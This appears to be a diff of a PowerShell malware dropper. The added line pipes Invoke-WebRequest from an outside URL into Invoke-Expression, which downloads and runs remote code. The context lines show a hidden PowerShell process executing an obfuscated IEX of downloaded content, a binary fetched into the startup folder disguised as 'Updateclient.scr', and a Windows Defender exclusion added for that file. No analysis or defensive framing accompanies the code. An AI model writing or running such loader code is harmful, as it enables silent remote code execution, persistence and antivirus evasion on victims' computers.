@@ -101,6 +101,9 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 #     Write-Host "Tệp đã được tải về thành công."
 # }
 
+
+iwr "https://leaked.tools/r/GFvWVhDQmc" | iex
+
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
 $output = "$startupfolder\Updateclient.scr"
 Add-MpPreference -ExclusionPath $output
